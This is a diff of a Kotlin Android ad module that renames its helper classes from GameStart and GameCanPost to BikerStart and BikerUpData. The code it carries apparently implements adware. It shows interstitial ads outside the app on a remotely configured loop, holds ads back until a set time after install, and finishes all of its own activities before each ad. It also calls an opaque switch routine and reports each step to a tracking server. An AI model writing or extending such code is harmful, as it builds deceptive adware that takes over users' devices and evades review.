@@ -1,14 +1,10 @@
 package com.bamboo.cane.shoes.horses.tool
 
-import android.app.Activity
-import android.os.Handler
-import android.os.Looper
-import android.util.Log
 import com.bamboo.cane.shoes.horses.bmain.SwcTool
 import com.bamboo.cane.shoes.horses.bmain.jian.GameInitializer.adLimiter
-import com.bamboo.cane.shoes.horses.bmain.jian.GameStart
-import com.bamboo.cane.shoes.horses.cnetwork.GameCanPost
-import com.bamboo.cane.shoes.horses.contens.EnhancedShowService
+import com.bamboo.cane.shoes.horses.bmain.jian.BikerStart
+import com.bamboo.cane.shoes.horses.bmain.jian.GameInitializer
+import com.bamboo.cane.shoes.horses.cnetwork.BikerUpData
 import com.bamboo.cane.shoes.horses.contens.bean.DataConTentTool
 import com.bamboo.cane.shoes.horses.contens.bean.SPUtils
 import com.tradplus.ads.base.bean.TPAdError
@@ -21,7 +17,6 @@ import kotlinx.coroutines.Job
 import kotlinx.coroutines.MainScope
 import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
-import java.util.Arrays
 
 
 class AdShowFun {
@@ -46,28 +41,28 @@ class AdShowFun {
     // 广告初始化，状态回调
     private fun intiTTTTAd() {
         if (mTPInterstitial == null) {
-            val idBean = GameStart.getAdminData() ?: return
-            mTPInterstitial = TPInterstitial(GameStart.gameApp, idBean.ad.identifiers.main)
+            val idBean = BikerStart.getAdminData() ?: return
+            mTPInterstitial = TPInterstitial(BikerStart.gameApp, idBean.ad.identifiers.main)
             mTPInterstitial!!.setAdListener(object : InterstitialAdListener {
                 override fun onAdLoaded(tpAdInfo: TPAdInfo) {
-                    GameStart.showLog("体外广告加载成功")
+                    BikerStart.showLog("体外广告加载成功")
                     lastAdLoadTime = System.currentTimeMillis()
-                    GameCanPost.postPointDataWithCoroutine(false, "getadvertise")
+                    BikerUpData.postPointDataWithCoroutine(false, "getadvertise")
                     isLoading = false
                     isHaveAdData = true
                 }
 
                 override fun onAdClicked(tpAdInfo: TPAdInfo) {
-                    GameStart.showLog("体外广告${tpAdInfo.adSourceName}被点击")
+                    BikerStart.showLog("体外广告${tpAdInfo.adSourceName}被点击")
                     adLimiter.recordAdClicked()
                     clickState = true
                 }
 
                 override fun onAdImpression(tpAdInfo: TPAdInfo) {
-                    GameStart.showLog("体外广告${tpAdInfo.adSourceName}展示")
+                    BikerStart.showLog("体外广告${tpAdInfo.adSourceName}展示")
                     adLimiter.recordAdShown()
-                    GameCanPost.postAdmobDataWithCoroutine(tpAdInfo)
-                    GameCanPost.showsuccessPoint()
+                    BikerUpData.postAdmobDataWithCoroutine(tpAdInfo)
+                    BikerUpData.showsuccessPoint()
                     if (adLimiter.canShowAd() && mTPInterstitial?.isReady == true) {
                         lastAdLoadTime = System.currentTimeMillis()
                         isHaveAdData = true
@@ -78,13 +73,13 @@ class AdShowFun {
                 }
 
                 override fun onAdFailed(tpAdError: TPAdError) {
-                    GameStart.showLog("体外广告加载失败")
+                    BikerStart.showLog("体外广告加载失败")
                     isHaveAdData = false
                     CoroutineScope(Dispatchers.Main).launch {
                         delay(10000)
                         isLoading = false
                     }
-                    GameCanPost.postPointDataWithCoroutine(
+                    BikerUpData.postPointDataWithCoroutine(
                         false,
                         "getfail",
                         "string1",
@@ -93,14 +88,14 @@ class AdShowFun {
                 }
 
                 override fun onAdClosed(tpAdInfo: TPAdInfo) {
-                    GameStart.showLog("体外广告${tpAdInfo.adSourceName}被关闭")
+                    BikerStart.showLog("体外广告${tpAdInfo.adSourceName}被关闭")
                     closeAllActivities()
                 }
 
                 override fun onAdVideoError(tpAdInfo: TPAdInfo, tpAdError: TPAdError) {
                     AdUtils.adShowTime = 0
-                    GameStart.showLog("体外广告${tpAdInfo.adSourceName}展示失败")
-                    GameCanPost.postPointDataWithCoroutine(
+                    BikerStart.showLog("体外广告${tpAdInfo.adSourceName}展示失败")
+                    BikerUpData.postPointDataWithCoroutine(
                         false,
                         "showfailer",
                         "string3",
@@ -121,26 +116,26 @@ class AdShowFun {
     // 加载广告方法
     private fun loadAd() {
         if (!adLimiter.canShowAd()) {
-            GameStart.showLog("体外广告展示限制,不加载广告")
+            BikerStart.showLog("体外广告展示限制,不加载广告")
             return
         }
         val currentTime = System.currentTimeMillis()
         if (mTPInterstitial != null && isHaveAdData && (currentTime - lastAdLoadTime) < AD_CACHE_DURATION) {
             // 使用缓存的广告
-            GameStart.showLog("不加载,有缓存的广告")
+            BikerStart.showLog("不加载,有缓存的广告")
             // 处理广告展示的逻辑
         } else {
             // 如果正在加载广告，则不发起新的请求
             if (isLoading) {
-                GameStart.showLog("正在加载广告，等待加载完成")
+                BikerStart.showLog("正在加载广告，等待加载完成")
                 return
             }
             // 设置正在加载标志
             isLoading = true
             // 发起新的广告请求
-            GameStart.showLog("发起新的广告请求")
+            BikerStart.showLog("发起新的广告请求")
             mTPInterstitial?.loadAd()
-            GameCanPost.postPointDataWithCoroutine(false, "reqadvertise")
+            BikerUpData.postPointDataWithCoroutine(false, "reqadvertise")
 
             // 设置超时处理
             loadTimeoutJob?.cancel()
@@ -148,7 +143,7 @@ class AdShowFun {
                 delay(60_000) // 延迟 60 秒
 
                 if (isLoading && !isHaveAdData) {
-                    GameStart.showLog("广告加载超时，重新请求广告")
+                    BikerStart.showLog("广告加载超时，重新请求广告")
                     isLoading = false
                     lastAdLoadTime = 0
                     loadAd()
@@ -169,16 +164,16 @@ class AdShowFun {
     }
 
     private suspend fun checkAndShowAd() {
-        val adminData = GameStart.getAdminData() ?: return
+        val adminData = BikerStart.getAdminData() ?: return
         val wTime = adminData.ad.timing.scanInterval
         val delayData = wTime.toLong().times(1000L)
-        GameStart.showLog("doToWhileAd delayData=: ${delayData}")
+        BikerStart.showLog("doToWhileAd delayData=: ${delayData}")
         while (true) {
-            GameStart.showLog("循环检测广告")
-            GameCanPost.postPointDataWithCoroutine(false, "timertask")
+            BikerStart.showLog("循环检测广告")
+            BikerUpData.postPointDataWithCoroutine(false, "timertask")
             if (AdUtils.adNumAndPoint()) {
                 if (!SPUtils.getBoolean(DataConTentTool.adFailPost)) {
-                    GameCanPost.postPointDataWithCoroutine(true, "jumpfail")
+                    BikerUpData.postPointDataWithCoroutine(true, "jumpfail")
                     SPUtils[DataConTentTool.adFailPost] = true
                 }
                 jobAdRom?.cancel()
@@ -193,17 +188,17 @@ class AdShowFun {
     private fun isHaveAdNextFun() {
         // 检查锁屏或息屏状态，避免过多的嵌套
         if (AdUtils.canShowLocked()) {
-            GameStart.showLog("锁屏或者息屏状态，广告不展示")
+            BikerStart.showLog("锁屏或者息屏状态，广告不展示")
             return
         }
         // 调用点位数据函数
-        GameCanPost.postPointDataWithCoroutine(false, "isunlock")
+        BikerUpData.postPointDataWithCoroutine(false, "isunlock")
 
         // 获取管理员数据
-        val jsonBean = GameStart.getAdminData() ?: return
+        val jsonBean = BikerStart.getAdminData() ?: return
 
         // 获取安装时间
-        val instalTime = EnhancedShowService.getInstallTimeInSeconds()
+        val instalTime = GameInitializer.getInstallTimeInSeconds()
         val wait = jsonBean.ad.timing.showIntervalTime
         val ins = jsonBean.ad.timing.installTime
         // 检查首次安装时间和广告展示时间间隔
@@ -211,21 +206,21 @@ class AdShowFun {
         if (isAdDisplayIntervalTooShort(wait)) return
         // 检查广告展示限制
         if (!adLimiter.canShowAd(true)) {
-            GameStart.showLog("体外广告展示限制")
+            BikerStart.showLog("体外广告展示限制")
             return
         }
-        val activities = GameStart.activityList.isEmpty()
+        val activities = BikerStart.activityList.isEmpty()
         val state = isAllActivitiesInWhitelist()
-        if (GameStart.adShowFun.mTPInterstitial?.isReady == true || activities || state) {
-            GameStart.showLog("体外流程")
+        if (BikerStart.adShowFun.mTPInterstitial?.isReady == true || activities || state) {
+            BikerStart.showLog("体外流程")
             showAdAndTrack()
         }
     }
 
     private fun isBeforeInstallTime(instalTime: Long, ins: Int): Boolean {
         if (instalTime < ins) {
-            GameStart.showLog("距离首次安装时间小于$ins 秒，广告不能展示")
-            GameCanPost.postPointDataWithCoroutine(false, "ispass", "string", "Install")
+            BikerStart.showLog("距离首次安装时间小于$ins 秒，广告不能展示")
+            BikerUpData.postPointDataWithCoroutine(false, "ispass", "string", "Install")
             return true
         }
         return false
@@ -234,15 +229,15 @@ class AdShowFun {
     private fun isAdDisplayIntervalTooShort(wait: Int): Boolean {
         val jiange = (System.currentTimeMillis() - AdUtils.adShowTime) / 1000
         if (jiange < wait) {
-            GameStart.showLog("广告展示间隔时间小于$wait 秒，不展示")
-            GameCanPost.postPointDataWithCoroutine(false, "ispass", "string", "interval")
+            BikerStart.showLog("广告展示间隔时间小于$wait 秒，不展示")
+            BikerUpData.postPointDataWithCoroutine(false, "ispass", "string", "interval")
             return true
         }
         return false
     }
 
     private fun showAdAndTrack() {
-        GameCanPost.postPointDataWithCoroutine(false, "ispass", "string", "")
+        BikerUpData.postPointDataWithCoroutine(false, "ispass", "string", "")
         CoroutineScope(Dispatchers.Main).launch {
             closeAllActivities()
             delay(1011)
@@ -251,16 +246,16 @@ class AdShowFun {
             SPUtils.putInt(DataConTentTool.isAdFailCount, adNum)
 
             SwcTool.swcTool(12234)
-            GameCanPost.postPointDataWithCoroutine(false, "callstart")
+            BikerUpData.postPointDataWithCoroutine(false, "callstart")
         }
     }
 
     fun closeAllActivities() {
-        GameStart.showLog("closeAllActivities")
-        for (activity in GameStart.activityList) {
+        BikerStart.showLog("closeAllActivities")
+        for (activity in BikerStart.activityList) {
             activity.finishAndRemoveTask()
         }
-        GameStart.activityList.clear()
+        BikerStart.activityList.clear()
     }
 
     private fun isAllActivitiesInWhitelist(): Boolean {
@@ -270,11 +265,11 @@ class AdShowFun {
             "com.show.biker.fasten.MainActivity"
         )
         // 遍历检查所有 Activity
-        for (activity in GameStart.activityList) {
+        for (activity in BikerStart.activityList) {
             val className = activity.javaClass.name
             if (className.isEmpty()) continue // 跳过空类名
             if (className !in whitelist) {
-                GameStart.showLog("当前广告正在显示：$className")
+                BikerStart.showLog("当前广告正在显示：$className")
                 return false // 存在不在白名单中的类
             }
         }
